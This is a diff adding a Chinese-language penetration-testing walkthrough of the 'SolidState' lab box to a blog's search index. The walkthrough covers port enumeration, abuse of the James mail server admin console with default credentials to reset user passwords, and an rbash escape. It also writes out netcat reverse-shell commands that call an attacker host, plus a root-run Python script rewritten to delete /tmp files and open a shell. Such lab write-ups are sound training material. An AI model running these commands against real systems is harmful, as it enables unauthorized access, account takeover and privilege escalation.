@@ -1462,4 +1462,137 @@
         <tag>vulnhub</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SolidState Walkthrough</title>
+    <url>/2025/04/03/SolidState/</url>
+    <content><![CDATA[<h1 id="SolidState-Walkthrough"><a href="#SolidState-Walkthrough" class="headerlink" title="SolidState Walkthrough"></a>SolidState Walkthrough</h1><h2 id="box-info"><a href="#box-info" class="headerlink" title="box info"></a>box info</h2><p><img src="/picture/image-20250311182630924.png" alt="image-20250311182630924"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标主机进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.35</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250209114134707.png" alt="image-20250209114134707"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,25,80,110,119,4555 -A 172.16.33.35</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250209114225570.png" alt="image-20250209114225570"></p>
+<p>发现 ssh 服务（22），SMTP、pop3 邮箱服务（25、110），http 服务（80），nntp 网络新闻传输服务（119），以及高位端口 4555 。</p>
+<blockquote>
+<p>SMTP 用于电子邮件的<strong>发送</strong>（服务器到服务器或客户端到服务器）。它是标准的邮件传输端口，通常不加密，但可通过STARTTLS升级加密</p>
+<p>POP3 用于从邮件服务器<strong>下载邮件到本地客户端</strong> 。默认不加密</p>
+</blockquote>
+<p>先从 80 端口 HTTP 服务开始，直接访问页面，发现聊天框，但是 action 的值为 # ，未能与客户端、服务端产生交互，是一个 花瓶 </p>
+<p><img src="/picture/image-20250209153921682.png" alt="image-20250209153921682"></p>
+<p>但是发现邮箱以及 IP 对应的域名，尝试用域名访问：</p>
+<blockquote>
+<p>用 IP 和域名访问的结果可能会大不相同</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>添加如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.16.33.35	solid-state-security.com</span><br><span class="line">172.16.33.35	www.solid-state-security.com</span><br></pre></td></tr></table></figure>
+
+<p>回显相同，猜测失败</p>
+<p>查看源码，为静态页面。源码中的链接下面都能通过 dirsearch 枚举出来</p>
+<p>尝试 dirsearch 扫一扫：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.35/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250209155851057.png" alt="image-20250209155851057"></p>
+<p>扫描出来的左右内容都没什么有价值的内容</p>
+<p>gobuster：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://172.16.33.35/ -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>emm… 啥啥都没有</p>
+<p><img src="/picture/image-20250209160553754.png" alt="image-20250209160553754"></p>
+<p>80 端口的 http 页面似乎没有漏洞，那就看看运行的  JAMES 2.3.2 有无漏洞</p>
+<p>能搜到有 RCE 漏洞，看看能不能直接利用：</p>
+<p><img src="/picture/image-20250209161535859.png" alt="image-20250209161535859"></p>
+<p>大致意思是创建名为 <code>../../../../../../../../etc/bash_completion.d</code> 的用户并将 payload 作为邮件内容发送给他</p>
+<blockquote>
+<p>只要别的用户登录这台主机，就会自动加载、执行 &#x2F;etc&#x2F;bash_completion.d 中的文件</p>
+</blockquote>
+<p>但是即使成功写入，本台靶机也没有后台进程登录这台主机，执行不了写入的 webshell ，</p>
+<p>再来看 4555 端口，使用默认账密 root&#x2F;root ，尝试用 telnet 连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 172.16.33.35 4555</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者用 nc ：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv -C 172.16.33.35 110</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>成功：</p>
+<p><img src="/picture/image-20250311134220443.png" alt="image-20250311134220443"></p>
+<p>查看存在的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listusers</span><br><span class="line">Existing accounts 5</span><br><span class="line">user: james</span><br><span class="line">user: thomas</span><br><span class="line">user: john</span><br><span class="line">user: mindy</span><br><span class="line">user: mailadmin</span><br></pre></td></tr></table></figure>
+
+<p>使用 setpassword 将所有存在用户密码设置为 12345</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setpassword james 12345</span><br><span class="line">setpassword thomas 12345</span><br><span class="line">setpassword john 12345</span><br><span class="line">setpassword mindy 12345</span><br><span class="line">setpassword mailadmin 12345</span><br></pre></td></tr></table></figure>
+
+<p>查看邮件内容，在 pop3 服务上分别查看存在用户的邮件是否存在以及是否泄露隐藏信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 172.16.33.35 110</span><br></pre></td></tr></table></figure>
+
+<p>查看 james ，没有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER james</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome james</span><br><span class="line">LIST 1</span><br><span class="line">-ERR Message (1) does not exist.</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>查看 thomas ，没有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER thomas </span><br><span class="line">+OK</span><br><span class="line">PASS 12345 </span><br><span class="line">+OK Welcome thomas</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>查看 john ，发现有一个邮件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER john</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome john</span><br><span class="line">LIST</span><br><span class="line">+OK 1 743</span><br><span class="line">1 743</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>查看文件内容，似乎说明了 mindy 的邮件泄露了他账号的密码</p>
+<p><img src="/picture/image-20250311140800670.png" alt="image-20250311140800670"></p>
+<p>查看 mindy ，发现有两篇邮件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER mindy</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome mindy</span><br><span class="line">LIST</span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>第一篇在祝贺她被录用</p>
+<p><img src="/picture/image-20250311140934063.png" alt="image-20250311140934063"></p>
+<p>第二篇找到她的 ssh 账户和密码：</p>
+<p><img src="/picture/image-20250311141052051.png" alt="image-20250311141052051"></p>
+<p>再看看 mailadmin ，没有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER mailadmin</span><br><span class="line">+OK</span><br><span class="line">PASS 12345</span><br><span class="line">+OK Welcome mailadmin</span><br><span class="line">LIST</span><br><span class="line">+OK 0 0</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>已知 mindy 账号和密码，使用 ssh 登陆：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mindy@172.16.33.35 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250311141955855.png" alt="image-20250311141955855"></p>
+<p>获得 user.txt ：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250311144133653.png" alt="image-20250311144133653"></p>
+<p>输入一些命令时能看到回显的 rbash 标志，需要 rbash 逃逸</p>
+<p><img src="/picture/image-20250311144552167.png" alt="image-20250311144552167"></p>
+<p>尝试 ssh 登录时逃逸：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mindy@172.16.33.35 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再次输入 sudo -l ，逃逸成功：</p>
+<p><img src="/picture/image-20250311144911661.png" alt="image-20250311144911661"></p>
+<blockquote>
+<p>或者使用 netexec 逃逸 rbash ，同时开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ssh 172.16.33.35 -u mindy -p &#x27;P@55W0rd1!2@&#x27; -x &#x27;nc 10.8.0.71 1234 -e /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250209170922621.png" alt="image-20250209170922621"></p>
+<p><img src="/picture/image-20250209170942930.png" alt="image-20250209170942930"></p>
+</blockquote>
+<p>在 Interesting writable files 中，我们会看到 <strong>&#x2F;opt&#x2F;tmp.py</strong> 文件可以由我们写入并且具有 root 权限。</p>
+<p><img src="/picture/image-20250311174536822.png" alt="image-20250311174536822"></p>
+<p>所有人能修改，所有人为 root </p>
+<p><img src="/picture/image-20250209171509612.png" alt="image-20250209171509612"></p>
+<p>该终端功能不完整，不能进行交互式编辑</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">     os.system(<span class="string">&#x27;nc 10.8.0.71 8023 -e /bin/bash&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">     sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>将内容保存至本地，增加反弹 shell 语句</p>
+<p><img src="/picture/image-20250311180548022.png" alt="image-20250311180548022"></p>
+<p>上传至目标主机并用 cp 覆盖原本靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.71:8888/tmp.py</span><br><span class="line">cp tmp.py /opt/tmp.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250311180912900.png" alt="image-20250311180912900"></p>
+<p>最多等待 5 分钟 getshell 并取得 root.txt</p>
+<p><img src="/picture/image-20250311181018959.png" alt="image-20250311181018959"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>THM</tag>
+      </tags>
+  </entry>
 </search>
